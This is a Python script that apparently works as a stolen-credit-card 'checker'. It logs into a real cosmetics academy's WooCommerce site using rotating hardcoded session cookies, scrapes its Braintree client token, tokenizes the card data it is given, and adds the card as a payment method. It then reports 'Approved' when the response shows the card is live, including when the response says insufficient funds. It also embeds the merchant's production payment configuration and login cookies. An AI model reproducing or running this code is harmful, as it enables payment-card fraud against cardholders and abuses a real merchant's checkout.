import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''hxhcdrr%7C1713641609%7CXOJGK2xFYyXD6Wom3p2Cujj2ZkzyHqXGk13kFuIl5z2%7Cedf540bbe280f3cab93eebcbdb30556e244f9cbfd6b72021d7ea61d6330bc024
jsnxuwv%7C1713641702%7CLuntNS8UCY3lTvN6Yq0pXDIWhRoQN6T2rIJcVUYHqrW%7C81172a53f2d4f6da23bb1b177581990c34ac15331baad10c4d3bad3500cd0559
bdjqisha%7C1713641764%7C6XL7TRIFD9CrHleBLzzCSt7ymVS4pAGUu5mYFW0s5XN%7C84adb5191193048c127086078a87c34bcf50e586791ccd976e5dd088b037346b
djdnsbba%7C1713641897%7CL5FleSTWtIImxvKpB3JvEdk09qZLTGEPUaxNadcBsno%7C7ebd4c043b84acda974813d5eaf330f62d91fad75f7ee3d0300f06abc52bcaf4'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878997.57.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Connection': 'keep-alive',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878997.57.0.0',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/payment-methods/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	response = requests.get('https://www.huntingtonacademy.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '698e6aaa-6b50-4bf0-adc4-d454c57ef68a',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	                'billingAddress': {
	                    'postalCode': '11743',
	                    'streetAddress': '',
	                },
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
	    '_ga': 'GA1.1.774315979.1711878714',
	    '_gcl_au': '1.1.169795609.1711878714',
	    'wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d': big,
	    'wfwaf-authcookie-8288059899a58842f2727962646eba72': '2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7',
	    '_ga_J890L8ECJX': 'GS1.1.1711878714.1.1.1711878764.10.0.0',
	}
	
	headers = {
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'Accept-Language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'Cache-Control': 'max-age=0',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    # 'Cookie': '_ga=GA1.1.774315979.1711878714; _gcl_au=1.1.169795609.1711878714; wordpress_logged_in_262b7659d399c680c1ad181f217b3f4d=visaspam77%7C1713088332%7Co1IP7tiJpkipfh2yKngvFR4oLuT02D2yLAOwRwGqmDb%7C56bf1ba7db092a0773b738a06eb7fa15b4ffd017038a897c08ef6a9a94812ab2; wfwaf-authcookie-8288059899a58842f2727962646eba72=2451%7Cother%7Cread%7C61ed8c290d2bf7186e5b6f5cec774f0c6c1594b849562370e6447a4b8b83ccf7; _ga_J890L8ECJX=GS1.1.1711878714.1.1.1711878764.10.0.0',
	    'Origin': 'https://www.huntingtonacademy.com',
	    'Referer': 'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    'Sec-Fetch-Dest': 'document',
	    'Sec-Fetch-Mode': 'navigate',
	    'Sec-Fetch-Site': 'same-origin',
	    'Sec-Fetch-User': '?1',
	    'Upgrade-Insecure-Requests': '1',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	data = {
	    'payment_method': 'braintree_cc',
	    'braintree_cc_nonce_key': tok,
	    'braintree_cc_device_data': '{"device_session_id":"d5e97ccc9f799eb2267d322e412447c7","fraud_merchant_id":null,"correlation_id":"337df1cb3591edc6154038e002f7aa88"}',
	    'braintree_cc_3ds_nonce_key': '',
	    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/88yh4wp5qmm383vy/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/88yh4wp5qmm383vy"},"merchantId":"88yh4wp5qmm383vy","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"payWithVenmo":{"merchantId":"3184501200456253861","accessToken":"access_token$production$88yh4wp5qmm383vy$046fed997ac2817cff08e18b6195f802","environment":"production"},"paypalEnabled":true,"paypal":{"displayName":"Huntington Academy of Permanent Cosmetics","clientId":"AVSrt_PxsQbUo8i9Vf3OcqThKuBqMkQGg-hRLlnTHO9r55agBf5KosAkmqFdhrjvnX-iVNe6p3miaPmP","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"huntingtonacademyofpermanentcosmetics_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
	    'woocommerce-add-payment-method-nonce': add_nonce,
	    '_wp_http_referer': '/my-account/add-payment-method/',
	    'woocommerce_add_payment_method': '1',
	}
	
	response = requests.post(
	    'https://www.huntingtonacademy.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'ابقي غطيها كويس لما تيجي تنام'